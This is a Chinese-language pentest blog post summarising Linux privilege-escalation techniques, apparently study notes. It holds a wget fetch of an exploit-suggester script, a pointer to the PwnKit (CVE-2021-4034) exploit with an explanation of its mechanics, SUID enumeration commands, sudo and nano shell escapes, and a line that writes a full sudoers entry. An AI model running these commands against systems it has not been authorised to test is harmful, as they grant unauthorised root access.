---
layout: article
title: Privilege Escalation in Linux
mathjax: true
key: a00033
cover: /bkgs/3.jpg
modify_date: 2022-2-21
show_author_profile: true
excerpt_type: html
tag: 
- Pentest
- Linux
mode: immersive
header:
  theme: dark
article_header:
  type: overlay
  theme: dark
  background_color: '#203028'
  background_image:
    gradient: 'linear-gradient(135deg, rgba(34, 139, 87 , .4), rgba(139, 34, 139, .4))'
    src: /docs/assets/images/cover3.jpg
---

整理了一些Linux提权的内容

<!--more-->

# 内核提权

```
uanme -a
lsb_release -a
```

~~一般直接内核梭哈~~，内核漏洞探测脚本,对应exp可以编译好了再传上去执行

| 一步到位         | wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh  <br />源地址：https://github.com/carlospolop/PEASS-ng |
| ---------------- | ------------------------------------------------------------ |
| 不用root枚举进程 | https://github.com/DominicBreuker/pspy                       |

## CVE-2021-4034 Polkit Pkexec

https://github.com/berdav/CVE-2021-4034

不受影响版本：

CentOS：polkit-0.115

Ubuntu：policykit-1- 0.105

这个比较严重且新就单独放一列。

一句话介绍就是越界读写漏洞，重新引入不安全的环境变量，进而构造利用链获取root权限

引入不安全的环境变量GCONV_PATH，随便构造个错误，使其报错时调用到 g_printer，触发漏洞利用，最终执行pwnkit.so里的execve("/bin/sh", args, environ)得到shell

# 权限机制

https://gtfobins.github.io/#    找命令或者其他blabla能不能提权，比如git等等。

## suid提权

一种权限机制，当程序运行的时候就会暂时获取文件所有者的权限

```
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 2>/dev/null
```

上面这两个结果差不多

```
find / -perm -g=s -type f 2>/dev/null
```

比如

```shell
#nano
sudo -u user /bin/nano
CRTL+R CRTL+X
reset; sh 1>&0 2>&0
```

## sudo

```
sudo -l 
```

看能不能操作一下，比如：

```shell
#awk
sudo awk ‘BEGIN {system(“/bin/bash”)}’
#teehee
echo "charles ALL=(ALL:ALL) ALL" | sudo teehee -a /etc/sudoers
#git
sudo git help config
!/bin/bash 
```

# 进程

1.一些以高权限执行的计划任务，想办法让其执行命令

2.一些有依赖的代码，改依赖内容（比如库等）

3.netstat –ano本机中现有服务是否可以提权

# 文件操作相关的

这些感觉不太容易出现

/etc/passwd 写入

/etc/shadow 爆破

/etc/crontab 弹shell

/var/spool/cron/  里面有每个用户的内容

/etc/sudoers

- 软链接

ln -s 源文件 目标文件

比如把某个命令换成/bin/bash